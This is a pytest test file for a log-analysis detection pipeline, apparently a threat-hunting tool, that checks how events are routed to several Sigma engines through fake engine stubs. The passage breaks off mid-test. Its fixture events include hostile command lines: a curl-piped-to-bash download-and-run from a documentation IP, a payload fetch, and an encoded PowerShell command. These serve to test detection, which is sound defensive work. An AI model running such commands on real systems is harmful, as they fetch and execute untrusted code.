"""Comprehensive offline tests for Milestone M3 detection engines & coverage."""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path
from typing import Any

import pytest

from apt_agent.config import AppConfig, EngineConfig, EnginesConfig
from apt_agent.detection import (
    AdapterOutput,
    ChainsawAdapter,
    DetectionCoordinator,
    DetectionResult,
    HayabusaAdapter,
    RSigmaAdapter,
    ZircoliteAdapter,
    classify_event_format,
    inspect_sigma_rules,
    normalize_level,
    normalize_sigma_tags,
)
from apt_agent.exceptions import InvalidArgumentError
from apt_agent.models import Event, Hit, RuleRun, RunContext


def _write_exe_script(path: Path, body: str) -> Path:
    path.write_text(f"#!/usr/bin/env python3\n{body}", encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return path


def _make_ctx(*, config: AppConfig | None = None) -> RunContext:
    return RunContext(
        case_id="case-m3-test",
        run_id="run-m3-001",
        ruleset_version="2026.01",
        config=config,
    )


def _sample_six_format_events() -> list[Event]:
    return [
        Event(
            event_id="evt_win_001",
            physical_record_id="pr-win-1",
            source_type="winxml_sysmon",
            event_time="2026-01-15T10:00:05Z",
            host="HOST1.corp.local",
            fields={
                "SystemTime": "2026-01-15T10:00:05.000000Z",
                "EventID": 1,
                "Version": 5,
                "Level": 4,
                "Task": 1,
                "Opcode": 0,
                "Keywords": "0x8000000000000000",
                "EventRecordID": 101,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Computer": "HOST1.corp.local",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Provider_Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
                "Execution_ProcessID": 1000,
                "Execution_ThreadID": 1004,
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -enc SQBFAFgA",
                "User": r"CORP\alice",
            },
            parse_metadata={"log_format": "winxml", "source_file": "sysmon.xml", "record_index": 1},
        ),
        Event(
            event_id="evt_zeek_002",
            physical_record_id="pr-zeek-1",
            source_type="zeek_conn",
            event_time="2026-01-15T10:00:01Z",
            fields={
                "log_source": "zeek",
                "zeek_log_type": "conn",
                "src_ip": "10.0.0.5",
                "src_port": 54321,
                "dst_ip": "198.51.100.10",
                "dst_port": 443,
                "proto": "tcp",
            },
            parse_metadata={"log_format": "zeek_json", "source_file": "conn.log", "record_index": 1},
        ),
        Event(
            event_id="evt_ecar_003",
            physical_record_id="pr-ecar-1",
            source_type="ecar",
            event_time="2026-01-15T10:00:02Z",
            host="HOST2",
            fields={
                "log_source": "ecar",
                "Computer": "HOST2",
                "User": "alice",
                "Image": "/usr/bin/curl",
                "CommandLine": "curl http://198.51.100.10/payload.sh",
            },
            parse_metadata={"log_format": "ecar_json", "source_file": "ecar.json", "record_index": 1},
        ),
        Event(
            event_id="evt_syslog_004",
            physical_record_id="pr-sys-1",
            source_type="syslog",
            event_time="2026-01-15T10:00:03Z",
            host="web01",
            fields={
                "log_source": "syslog",
                "hostname": "web01",
                "app_name": "sshd",
                "message": "Accepted publickey for root from 10.0.0.9",
            },
            parse_metadata={"log_format": "syslog", "source_file": "auth.log", "record_index": 1},
        ),
        Event(
            event_id="evt_web_005",
            physical_record_id="pr-web-1",
            source_type="web_access",
            event_time="2026-01-15T10:00:04Z",
            fields={
                "log_source": "web_access",
                "c-ip": "198.51.100.99",
                "cs-method": "POST",
                "cs-uri": "/login.php",
                "sc-status": 200,
                "cs-User-Agent": "curl/8.0",
            },
            parse_metadata={"log_format": "web_access", "source_file": "access.log", "record_index": 1},
        ),
        Event(
            event_id="evt_bash_006",
            physical_record_id="pr-bash-1",
            source_type="bash_history",
            event_time="2026-01-15T10:00:00Z",
            fields={
                "log_source": "bash_history",
                "User": "ubuntu",
                "Image": "/bin/bash",
                "CommandLine": "curl -s http://198.51.100.10/p.sh | bash",
            },
            parse_metadata={"log_format": "bash_history", "source_file": ".bash_history", "record_index": 1},
        ),
    ]


def test_mitre_tag_and_level_normalization() -> None:
    tactics, techs = normalize_sigma_tags(
        [
            "attack.execution",
            "attack.defense-evasion",
            "attack.defense_evasion",
            "attack.ta0008",
            "attack.t1059.001",
            "attack.T1003",
            "cve.2024.1234",
        ],
        mitre_tactics=[
            "Recon",
            "ResDev",
            "InitAccess",
            "Exec",
            "Persis",
            "PrivEsc",
            "Stealth",
            "DefImpair",
            "CredAccess",
            "Disc",
            "LatMov",
            "Collect",
            "C2",
            "Exfil",
            "Impact",
        ],
        mitre_tags=["T1082", "t1059.001"],
    )
    assert tactics == [
        "TA0001",
        "TA0002",
        "TA0003",
        "TA0004",
        "TA0005",
        "TA0006",
        "TA0007",
        "TA0008",
        "TA0009",
        "TA0010",
        "TA0011",
        "TA0040",
        "TA0042",
        "TA0043",
    ]
    assert techs == ["T1003", "T1059.001", "T1082"]
    assert normalize_level("crit") == "critical"
    assert normalize_level("med") == "medium"
    assert normalize_level("info") == "informational"
    assert normalize_level("HIGH") == "high"
    assert normalize_level(None) is None


def test_multi_format_routing_and_cli_flags_all_engines(tmp_path: Path) -> None:
    events = _sample_six_format_events()
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()
    (rules_dir / "dummy.yml").write_text("title: dummy\n", encoding="utf-8")

    haya_cfg_dir = tmp_path / "haya_rules_cfg"
    haya_cfg_dir.mkdir()
    (haya_cfg_dir / "channel_eid_info.txt").write_text("Security\n", encoding="utf-8")

    chainsaw_win_map = tmp_path / "sigma-event-logs-json.yml"
    chainsaw_win_map.write_text("name: win\n", encoding="utf-8")

    takajo_dir = tmp_path / "takajo_home"
    takajo_dir.mkdir()

    obs_dir = tmp_path / "observations"
    obs_dir.mkdir()

    zirc_bin = _write_exe_script(
        tmp_path / "fake_zircolite.py",
        f"""
import json, os, sys
from pathlib import Path

args = sys.argv[1:]
if args == ["--version"]:
    Path("zircolite.log").write_text("probe log in cwd\\n")
    print("Zircolite v4.8.0")
    sys.exit(0)

assert "-n" not in args and "--nolog" not in args, f"Forbidden -n flag in {{args}}"
assert "-l" in args, f"Missing -l in {{args}}"
log_file = Path(args[args.index("-l") + 1])
assert log_file.parent == Path(os.getcwd()), f"Log file must be inside temp cwd: {{log_file}} vs {{os.getcwd()}}"
assert "-c" in args, f"Expected default zircolite_config.yaml via -c: {{args}}"
in_file = Path(args[args.index("-e") + 1])
out_file = Path(args[args.index("-o") + 1])
rows = [json.loads(line) for line in in_file.read_text().splitlines() if line.strip()]
Path({str(obs_dir / "zirc_in.json")!r}).write_text(json.dumps({{"count": len(rows), "event_ids": [r["event_id"] for r in rows], "argv": args}}))
out_file.write_text(json.dumps([{{
    "title": "Zirc PS",
    "id": "z-rule-1",
    "rule_level": "high",
    "tags": ["attack.execution", "attack.t1059.001"],
    "matches": [{{"row_id": 1, "event_id": "evt_win_001", "SystemTime": "2026-01-15T10:00:05Z"}}],
}}]))
""",
    )

    haya_bin = _write_exe_script(
        tmp_path / "fake_hayabusa.py",
        f"""
import json, sys
from pathlib import Path

args = sys.argv[1:]
if args == ["--version"]:
    print("unexpected argument '--version'", file=sys.stderr)
    sys.exit(2)

for flag in ("-J", "-w", "-U", "-O", "-b", "-C", "-Q", "-q", "-N", "-K"):
    assert flag in args, f"Missing Hayabusa flag {{flag}} in {{args}}"
assert args[args.index("-t") + 1] == "jsonl"
assert args[args.index("-p") + 1] == "super-verbose"
in_file = Path(args[args.index("-f") + 1])
out_file = Path(args[args.index("-o") + 1])
rows = [json.loads(line) for line in in_file.read_text().splitlines() if line.strip()]
Path({str(obs_dir / "haya_in.json")!r}).write_text(json.dumps({{"count": len(rows), "event_ids": [r.get("event_id") for r in rows], "argv": args}}))
print("Hayabusa v4.5.0\\nVersion: 4.5.0")
# Emit hit WITHOUT event_id to exercise reverse lookup via (Computer, Channel, RecordID)!
out_file.write_text(json.dumps({{
    "Timestamp": "2026-01-15T10:00:05.000000Z",
    "RuleTitle": "Haya PS",
    "RuleID": "h-rule-1",
    "Level": "crit",
    "Computer": "HOST1.corp.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "EventID": 1,
    "RecordID": 101,
    "MitreTactics": ["Exec"],
    "MitreTags": ["T1059.001"],
}}) + "\\n")
""",
    )

    takajo_bin = _write_exe_script(
        takajo_dir / "fake_takajo.py",
        f"""
import os, sys
from pathlib import Path

args = sys.argv[1:]
if args == ["--version"]:
    assert Path(os.getcwd()).resolve() == Path({str(takajo_dir)!r}).resolve()
    print("2.16.1")
    sys.exit(0)

assert Path(os.getcwd()).resolve() == Path({str(takajo_dir)!r}).resolve(), f"Takajo cwd mismatch: {{os.getcwd()}}"
subcmd = args[0]
out_csv = Path(args[args.index("-o") + 1])
out_csv.write_text("Computer,Count,Summary\\nHOST1.corp.local,1," + subcmd + "\\n")
Path({str(obs_dir / "takajo_subcmds.txt")!r}).open("a").write(subcmd + "\\n")
""",
    )

    rsigma_bin = _write_exe_script(
        tmp_path / "fake_rsigma.py",
        f"""
import json, sys
from pathlib import Path

args = sys.argv[1:]
if args == ["--version"]:
    print("rsigma 0.28.0")
    sys.exit(0)

assert args[:2] == ["engine", "eval"]
assert "--emit-detections" in args
assert "--include-event" in args
assert args[args.index("--correlation-event-mode") + 1] == "full"
assert args[args.index("--output-format") + 1] == "ndjson"
assert "-p" in args, f"Expected default rsigma_pipeline.yml via -p: {{args}}"
e_arg = args[args.index("-e") + 1]
assert e_arg.startswith("@"), f"RSigma -e must start with @: {{e_arg}}"
in_file = Path(e_arg[1:])
out_file = Path(args[args.index("-o") + 1])
rows = [json.loads(line) for line in in_file.read_text().splitlines() if line.strip()]
Path({str(obs_dir / "rsigma_in.json")!r}).write_text(json.dumps({{"count": len(rows), "event_ids": [r["event_id"] for r in rows], "timestamps": [r["@timestamp"] for r in rows]}}))
out_file.write_text(json.dumps({{
    "rule_title": "RSigma Bash Curl",
    "rule_id": "r-rule-bash",
    "level": "med",
    "tags": ["attack.execution", "attack.t1059.004"],
    "event": {{"event_id": "evt_bash_006", "@timestamp": "2026-01-15T10:00:00Z"}},
}}) + "\\n")
""",
    )

    chainsaw_bin = _write_exe_script(
        tmp_path / "fake_chainsaw.py",
        f"""
import json, sys
from pathlib import Path

args = sys.argv[1:]
if args == ["--version"]:
    print("chainsaw 2.18.0")
    sys.exit(0)

assert args[0] == "hunt"
assert "--json" in args and "--skip-errors" in args
map_path = Path(args[args.index("-m") + 1])
out_file = Path(args[args.index("-o") + 1])
in_file = Path(args[-1])
rows = json.loads(in_file.read_text())
assert isinstance(rows, list), "Chainsaw input must be JSON array"
tag = "win" if map_path.name == "sigma-event-logs-json.yml" else "nonwin"
Path({str(obs_dir / "chainsaw_")!r} + tag + ".json").write_text(json.dumps({{"count": len(rows), "event_ids": [r["event_id"] for r in rows], "map": str(map_path)}}))
if tag == "win":
    out_file.write_text(json.dumps([{{
        "id": "c-rule-win",
        "name": "Chainsaw Win PS",
        "level": "high",
        "tags": ["attack.defense-evasion"],
        "timestamp": "2026-01-15T10:00:05+00:00",
        "document": {{"kind": "json", "data": {{"event_id": "evt_win_001"}}}},
    }}]))
else:
    out_file.write_text(json.dumps([{{
        "id": "c-rule-zeek",
        "name": "Chainsaw Zeek",
        "level": "low",
        "tags": ["attack.command-and-control"],
        "timestamp": "2026-01-15T10:00:01+00:00",
        "document": {{"kind": "json", "data": {{"event_id": "evt_zeek_002"}}}},
    }}]))
""",
    )

    cfg = AppConfig(
        engines=EnginesConfig(
            zircolite=EngineConfig(bin_path=zirc_bin, rules_dir=rules_dir),
            hayabusa=EngineConfig(bin_path=haya_bin, rules_dir=rules_dir, config_path=haya_cfg_dir),
            takajo=EngineConfig(bin_path=takajo_bin, working_dir=takajo_dir),
            rsigma=EngineConfig(bin_path=rsigma_bin, rules_dir=rules_dir),
            chainsaw=EngineConfig(bin_path=chainsaw_bin, rules_dir=rules_dir, mapping_path=chainsaw_win_map),
            pysigma=EngineConfig(enabled=False),
        )
    )
    ctx = _make_ctx(config=cfg)
    result = DetectionCoordinator(cfg).detect(ctx, events)

    assert isinstance(result, DetectionResult)
    # Dual access contract
    assert result["hits"] == result.hits
    assert result.get("coverage") == result.coverage
    assert "leads" in result
    assert set(result.keys()) == {"hits", "coverage", "leads", "event_to_physical"}
    assert result.to_dict()["event_to_physical"]["evt_win_001"] == "pr-win-1"

    # Verify routing counts
    zirc_obs = json.loads((obs_dir / "zirc_in.json").read_text())
    assert zirc_obs["count"] == 6

    haya_obs = json.loads((obs_dir / "haya_in.json").read_text())
    assert haya_obs["count"] == 1
    assert haya_obs["event_ids"] == ["evt_win_001"]

    rsigma_obs = json.loads((obs_dir / "rsigma_in.json").read_text())
    assert rsigma_obs["count"] == 6
    # Verify chronological UTC sort: 10:00:00 (bash) .. 10:00:05 (win)
    assert rsigma_obs["event_ids"] == [
        "evt_bash_006",
        "evt_zeek_002",
        "evt_ecar_003",
        "evt_syslog_004",
        "evt_web_005",
        "evt_win_001",
    ]

    cs_win_obs = json.loads((obs_dir / "chainsaw_win.json").read_text())
    cs_nonwin_obs = json.loads((obs_dir / "chainsaw_nonwin.json").read_text())
    assert cs_win_obs["event_ids"] == ["evt_win_001"]
    assert cs_nonwin_obs["count"] == 5

    # Verify Takajo ran all 4 subcommands and emitted strictly leads (never Hits)
    takajo_subcmds = (obs_dir / "takajo_subcmds.txt").read_text().splitlines()
    assert takajo_subcmds == [
        "timeline-suspicious-processes",
        "stack-processes",
        "stack-cmdlines",
        "ttp-summary",
    ]
    assert len(result.leads) == 4
    assert all(lead["engine"] == "takajo" for lead in result.leads)
    assert all(h.engine != "takajo" for h in result.hits)

    # Verify multi-engine deduplication on evt_win_001 (Zircolite + Hayabusa + Chainsaw)
    win_hits = [h for h in result.hits if h.event_ids == ["evt_win_001"]]
    assert len(win_hits) == 1
    merged_win = win_hits[0]
    assert merged_win.level == "critical"  # Hayabusa 'crit' -> 'critical'
    assert merged_win.matched_fields["engines"] == ["chainsaw", "hayabusa", "zircolite"]
    assert merged_win.matched_fields["rule_ids"] == ["c-rule-win", "h-rule-1", "z-rule-1"]
    assert len(merged_win.matched_fields["contributing_sources"]) == 3
    assert set(merged_win.tactic_ids) == {"TA0002", "TA0005"}
    assert merged_win.technique_ids == ["T1059.001"]

    # Verify repo root has no stray zircolite.log
    repo_root = Path(__file__).resolve().parents[2]
    assert not (repo_root / "zircolite.log").exists()


def test_hayabusa_config_fallback_and_explicit_missing_config_skipped(tmp_path: Path) -> None:
    events = [_sample_six_format_events()[0]]
    rules_dir = tmp_path / "hayabusa_home" / "rules"
    (rules_dir / "config").mkdir(parents=True)
    (rules_dir / "config" / "channel_eid_info.txt").write_text("Sysmon\n", encoding="utf-8")
    bad_cfg_dir = tmp_path / "hayabusa_home" / "config"
    bad_cfg_dir.mkdir(parents=True)  # lacks channel_eid_info.txt!

    obs_file = tmp_path / "seen_c.txt"
    haya_bin = _write_exe_script(
        tmp_path / "hayabusa_home" / "haya.py",
        f"""
import json, sys
from pathlib import Path
args = sys.argv[1:]
c_val = args[args.index("-c") + 1] if "-c" in args else ""
Path({str(obs_file)!r}).write_text(c_val, encoding="utf-8")
Path(args[args.index("-o") + 1]).write_text("")
print(f"USED_C={{c_val}}")
""",
    )
    out = HayabusaAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(bin_path=haya_bin, rules_dir=rules_dir, config_path=bad_cfg_dir),
        ruleset_version="v1",
    )
    # 0-hit clean run -> status="ran", hit_count=0, reason=None
    assert len(out.coverage) == 1
    assert out.coverage[0].status == "ran"
    assert out.coverage[0].hit_count == 0
    assert out.coverage[0].reason is None
    assert obs_file.read_text(encoding="utf-8") == str(rules_dir / "config")

    # Explicit missing config_path for Hayabusa must be skipped even when rules_dir/config exists
    h_missing_out = HayabusaAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(
            bin_path=haya_bin,
            rules_dir=rules_dir,
            config_path=tmp_path / "missing_hayabusa_config",
        ),
        ruleset_version="v1",
    )
    assert len(h_missing_out.coverage) == 1
    assert h_missing_out.coverage[0].status == "skipped"
    assert "config_not_found" in (h_missing_out.coverage[0].reason or "")

    # Explicit missing config_path for Zircolite must be skipped, NOT silently overridden by repo default
    zirc_bin = _write_exe_script(tmp_path / "zirc.py", "import sys\nsys.exit(1)\n")
    z_out = ZircoliteAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(
            bin_path=zirc_bin,
            rules_dir=rules_dir,
            config_path=tmp_path / "does_not_exist.yaml",
        ),
        ruleset_version="v1",
    )
    assert z_out.coverage[0].status == "skipped"
    assert "config_not_found" in (z_out.coverage[0].reason or "")


def test_zircolite_correlation_extracts_canonical_event_ids_and_ignores_bogus(tmp_path: Path) -> None:
    events = _sample_six_format_events()[:2]  # evt_win_001, evt_zeek_002
    rules_dir = tmp_path / "rules.json"
    rules_dir.write_text("[]", encoding="utf-8")

    zirc_bin = _write_exe_script(
        tmp_path / "zirc_corr.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("v4.8.0")
    sys.exit(0)
out_file = Path(args[args.index("-o") + 1])
out_file.write_text(json.dumps([
    {
        "title": "Corr Valid",
        "id": "z-corr-1",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 2,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "sigma_alert_1:1",
                "event_ids": ["0:1", "0:2"],
                "evidence": [
                    {"event_id": "0:1", "event": {"row_id": 1, "event_id": "evt_win_001"}},
                    {"event_id": "0:2", "event": {"row_id": 2, "event_id": "evt_zeek_002"}},
                ],
                "SystemTime": "2026-01-15T10:00:05Z",
            }
        ],
    },
    {
        "title": "Bogus Event Rule",
        "id": "z-bogus",
        "rule_level": "low",
        "tags": [],
        "matches": [{"row_id": 999, "event_id": "evt_NOT_IN_CASE"}],
    },
]))
""",
    )

    out = ZircoliteAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(bin_path=zirc_bin, rules_dir=rules_dir),
        ruleset_version="v1",
    )
    assert len(out.hits) == 1
    assert out.hits[0].rule_id == "z-corr-1"
    assert out.hits[0].event_ids == ["evt_win_001", "evt_zeek_002"]
    assert out.hits[0].tactic_ids == ["TA0008"]
    assert "0:1" not in out.hits[0].event_ids


def test_rsigma_correlation_count_only_and_truncated_partial(tmp_path: Path) -> None:
    events = _sample_six_format_events()[:2]
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()

    rsigma_bin = _write_exe_script(
        tmp_path / "rsigma_corr.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("rsigma 0.28.0")
    sys.exit(0)
out_file = Path(args[args.index("-o") + 1])
lines = [
    {
        "rule_title": "Count Only Corr",
        "rule_id": "r-corr-count-only",
        "level": "medium",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "group_key": [["User", "alice"]],
        "aggregated_value": 5.0,
        "timespan_secs": 300,
    },
    {
        "rule_title": "Truncated Corr",
        "rule_id": "r-corr-truncated",
        "level": "high",
        "tags": ["attack.execution"],
        "correlation_type": "temporal_ordered",
        "group_key": [["User", "alice"]],
        "aggregated_value": 3.0,
        "timespan_secs": 300,
        "events": [{"event_id": "evt_win_001", "@timestamp": "2026-01-15T10:00:05Z"}],
    },
    {
        "rule_title": "Full Corr",
        "rule_id": "r-corr-full",
        "level": "high",
        "tags": ["attack.lateral_movement"],
        "correlation_type": "temporal",
        "aggregated_value": 2.0,
        "events": [
            {"event_id": "evt_zeek_002", "@timestamp": "2026-01-15T10:00:01Z"},
            {"event_id": "evt_win_001", "@timestamp": "2026-01-15T10:00:05Z"},
        ],
    },
]
out_file.write_text("\\n".join(json.dumps(x) for x in lines) + "\\n")
""",
    )

    cfg = AppConfig(
        engines=EnginesConfig(
            zircolite=EngineConfig(enabled=False),
            hayabusa=EngineConfig(enabled=False),
            takajo=EngineConfig(enabled=False),
            chainsaw=EngineConfig(enabled=False),
            rsigma=EngineConfig(bin_path=rsigma_bin, rules_dir=rules_dir),
            pysigma=EngineConfig(enabled=False),
        )
    )
    res = DetectionCoordinator(cfg).detect(_make_ctx(config=cfg), events)

    # Count-only correlation must produce is_lead_only=True Hit AND a lead entry
    lead_hits = [h for h in res.hits if h.is_lead_only]
    assert len(lead_hits) == 1
    assert lead_hits[0].rule_id == "r-corr-count-only"
    assert lead_hits[0].event_ids == []
    assert len(res.leads) == 1
    assert res.leads[0]["kind"] == "correlation_count_only"
    assert res.leads[0]["count"] == 5.0

    # Truncated correlation marks matched_fields["truncated_correlation"] and RuleRun status="partial"
    trunc_hits = [h for h in res.hits if h.rule_id == "r-corr-truncated"]
    assert len(trunc_hits) == 1
    assert trunc_hits[0].matched_fields.get("truncated_correlation") is True
    trunc_cov = [r for r in res.coverage if r.rule_id == "r-corr-truncated"]
    assert len(trunc_cov) == 1
    assert trunc_cov[0].status == "partial"
    assert trunc_cov[0].reason == "correlation_events_truncated"

    # Full correlation preserves both constituent event_ids
    full_hits = [h for h in res.hits if h.rule_id == "r-corr-full"]
    assert len(full_hits) == 1
    assert full_hits[0].event_ids == ["evt_win_001", "evt_zeek_002"]


def test_engine_isolation_crash_timeout_corrupt_and_skipped_matrix(tmp_path: Path) -> None:
    events = [_sample_six_format_events()[1]]  # zeek_conn only (no winxml!)
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()

    crash_bin = _write_exe_script(
        tmp_path / "crash.py",
        "import sys\nsys.stderr.write('boom crash\\n')\nsys.exit(1)\n",
    )
    slow_bin = _write_exe_script(
        tmp_path / "slow.py",
        "import sys, time\nif sys.argv[1:] == ['--version']: sys.exit(0)\ntime.sleep(2.0)\n",
    )
    corrupt_bin = _write_exe_script(
        tmp_path / "corrupt.py",
        """
import sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    sys.exit(0)
Path(args[args.index("-o") + 1]).write_text("{not valid json")
""",
    )
    healthy_bin = _write_exe_script(
        tmp_path / "healthy_zirc.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("v4.8.0")
    sys.exit(0)
Path(args[args.index("-o") + 1]).write_text(json.dumps([{
    "title": "Healthy Zeek",
    "id": "z-zeek-ok",
    "rule_level": "medium",
    "tags": ["attack.command-and-control"],
    "matches": [{"row_id": 1, "event_id": "evt_zeek_002"}],
}]))
""",
    )

    # 1. Timeout on RSigma, corrupt JSON on Chainsaw, skipped Hayabusa (no winxml), healthy Zircolite
    cfg = AppConfig(
        engines=EnginesConfig(
            zircolite=EngineConfig(bin_path=healthy_bin, rules_dir=rules_dir),
            hayabusa=EngineConfig(bin_path=crash_bin, rules_dir=rules_dir),  # skipped due to no winxml
            takajo=EngineConfig(enabled=False),
            rsigma=EngineConfig(bin_path=slow_bin, rules_dir=rules_dir, timeout_s=0.15),
            chainsaw=EngineConfig(bin_path=corrupt_bin, rules_dir=rules_dir),
            pysigma=EngineConfig(enabled=False),
        )
    )
    res = DetectionCoordinator(cfg).detect(_make_ctx(config=cfg), events)
    assert len(res.hits) == 1
    assert res.hits[0].engine == "zircolite"
    assert res.hits[0].event_ids == ["evt_zeek_002"]

    by_engine = {r.engine: r for r in res.coverage}
    assert by_engine["zircolite"].status == "ran"
    assert by_engine["hayabusa"].status == "skipped"
    assert by_engine["rsigma"].status == "failed"
    assert "timed out" in (by_engine["rsigma"].reason or "").lower()
    assert by_engine["chainsaw"].status == "failed"
    assert "invalid_json_output" in (by_engine["chainsaw"].reason or "")

    # 2. Crash (non-zero exit) on Zircolite + custom exploding adapter isolated
    class ExplodingAdapter:
        engine_name = "custom_boom"
        supported_formats = frozenset({"zeek_json"})

        def run(self, ctx: RunContext, evs: Any, cfg: EngineConfig, *, ruleset_version: str) -> AdapterOutput:
            raise RuntimeError("unexpected adapter bug")

    cfg2 = AppConfig(
        engines=EnginesConfig(
            zircolite=EngineConfig(bin_path=crash_bin, rules_dir=rules_dir),
            pysigma=EngineConfig(enabled=False),
        )
    )
    res2 = DetectionCoordinator(
        cfg2,
        adapters=[ZircoliteAdapter(), ExplodingAdapter()],
    ).detect(_make_ctx(config=cfg2), events)
    cov2 = {r.engine: r for r in res2.coverage}
    assert cov2["zircolite"].status == "failed"
    assert "exit_1" in (cov2["zircolite"].reason or "")
    assert cov2["custom_boom"].status == "failed"
    assert "RuntimeError" in (cov2["custom_boom"].reason or "")


def test_chainsaw_windows_missing_mapping_skipped_and_partial_stderr(tmp_path: Path) -> None:
    events = _sample_six_format_events()[:2]  # 1 winxml + 1 zeek
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()

    cs_bin = _write_exe_script(
        tmp_path / "fake_cs.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("chainsaw 2.18.0")
    sys.exit(0)
sys.stderr.write("Skipping unsupported correlation rule\\n")
Path(args[args.index("-o") + 1]).write_text("[]")
""",
    )
    out = ChainsawAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(bin_path=cs_bin, rules_dir=rules_dir, mapping_path=None),
        ruleset_version="v1",
    )
    by_rule = {r.rule_id: r for r in out.coverage}
    assert by_rule["chainsaw.windows"].status == "skipped"
    assert by_rule["chainsaw.windows"].reason == "mapping_not_configured"
    assert by_rule["chainsaw.non_windows"].status == "partial"
    assert by_rule["chainsaw.non_windows"].hit_count == 0


def test_pysigma_static_rule_inspection_and_coordinator_integration(tmp_path: Path) -> None:
    rules_dir = tmp_path / "sigma_rules"
    rules_dir.mkdir()

    (rules_dir / "win_ps.yml").write_text(
        """
title: Windows PowerShell
id: 11111111-1111-1111-1111-111111111111
name: win_ps
status: test
date: 2026-01-10
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains: powershell
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059.001
""",
        encoding="utf-8",
    )
    (rules_dir / "linux_bash.yml").write_text(
        """
title: Linux Curl Pipe
id: 22222222-2222-2222-2222-222222222222
status: test
date: 2026-01-11
logsource:
  product: linux
  service: bash
detection:
  selection:
    CommandLine|contains: curl
  condition: selection
level: medium
tags:
  - attack.execution
""",
        encoding="utf-8",
    )
    (rules_dir / "corr_win.yml").write_text(
        """
title: Windows Correlation
id: 33333333-3333-3333-3333-333333333333
date: 2026-01-12
correlation:
  type: event_count
  rules:
    - win_ps
  group-by:
    - User
  timespan: 5m
  condition:
    gte: 2
level: high
tags:
  - attack.discovery
""",
        encoding="utf-8",
    )
    (rules_dir / "broken_rule.yml").write_text(
        "title: Broken Rule\ndetection:\n  selection: [\n",
        encoding="utf-8",
    )

    # Batch has ONLY zeek_json -> Windows rules skipped, Linux rule skipped, broken rule failed
    cov_zeek = inspect_sigma_rules(
        rules_dir,
        batch_formats={"zeek_json"},
        ruleset_version="v1",
    )
    by_id = {r.rule_id: r for r in cov_zeek}
    assert by_id["11111111-1111-1111-1111-111111111111"].status == "skipped"
    assert by_id["22222222-2222-2222-2222-222222222222"].status == "skipped"
    assert by_id["33333333-3333-3333-3333-333333333333"].status == "skipped"
    assert by_id["broken_rule"].status == "failed"

    # Batch has winxml -> Windows rules + Windows correlation rule ran, Linux rule skipped, broken failed
    cfg = AppConfig(
        engines=EnginesConfig(
            zircolite=EngineConfig(enabled=False),
            hayabusa=EngineConfig(enabled=False),
            takajo=EngineConfig(enabled=False),
            chainsaw=EngineConfig(enabled=False),
            rsigma=EngineConfig(enabled=False),
            pysigma=EngineConfig(enabled=True, rules_dir=rules_dir),
        )
    )
    res = DetectionCoordinator(cfg).detect(
        _make_ctx(config=cfg),
        [_sample_six_format_events()[0]],
    )
    pysig = {r.rule_id: r for r in res.coverage if r.engine == "pysigma"}
    assert pysig["11111111-1111-1111-1111-111111111111"].status == "ran"
    assert pysig["33333333-3333-3333-3333-333333333333"].status == "ran"
    assert pysig["22222222-2222-2222-2222-222222222222"].status == "skipped"
    assert pysig["broken_rule"].status == "failed"


def test_coordinator_validation_empty_events_and_bogus_hit_filtering() -> None:
    coord = DetectionCoordinator(AppConfig())
    ctx = _make_ctx()

    with pytest.raises(InvalidArgumentError):
        coord.detect("not-a-ctx", [])  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        coord.detect(ctx, "not-a-sequence")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        coord.detect(ctx, b"bytes")  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        coord.detect(ctx, {"a": 1})  # type: ignore[arg-type]
    with pytest.raises(InvalidArgumentError):
        coord.detect(ctx, ["bad-event"])  # type: ignore[list-item]

    empty_res = coord.detect(ctx, [])
    assert empty_res.hits == []
    assert empty_res.leads == []
    assert empty_res.event_to_physical == {}
    assert all(r.status == "skipped" for r in empty_res.coverage)

    # Bogus non-lead Hit emitted by an adapter must be dropped, NOT turned into a count-only lead!
    class BogusAdapter:
        engine_name = "zircolite"
        supported_formats = frozenset({"zeek_json"})

        def run(self, c: RunContext, evs: Any, cfg: EngineConfig, *, ruleset_version: str) -> AdapterOutput:
            return AdapterOutput(
                engine="zircolite",
                hits=[
                    Hit(
                        hit_id="hit_bogus",
                        rule_id="r-bogus",
                        engine="zircolite",
                        event_ids=["evt_does_not_exist"],
                    )
                ],
                coverage=[RuleRun(rule_id="r-bogus", engine="zircolite", status="ran", hit_count=0)],
            )

    res_bogus = DetectionCoordinator(
        AppConfig(engines=EnginesConfig(pysigma=EngineConfig(enabled=False))),
        adapters=[BogusAdapter()],
    ).detect(ctx, [_sample_six_format_events()[1]])
    assert res_bogus.hits == []
    assert res_bogus.leads == []
    assert classify_event_format(_sample_six_format_events()[1]) == "zeek_json"


def test_hayabusa_filters_unknown_format_events_in_mixed_batch(tmp_path: Path) -> None:
    win_ev = _sample_six_format_events()[0]
    unknown_ev = Event(
